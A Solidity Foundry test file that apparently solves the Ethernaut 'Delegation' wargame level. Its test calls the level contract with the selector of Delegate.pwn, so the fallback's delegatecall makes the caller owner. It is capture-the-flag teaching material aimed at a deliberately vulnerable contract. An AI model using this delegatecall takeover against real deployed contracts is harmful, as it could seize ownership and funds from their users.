// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/6_Delegation.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_6_DELEGATION_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public validateInstance {
        Delegation delegation = Delegation(levelInstance);
        
        (bool result, ) = address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(result, "Call failed");
    }
}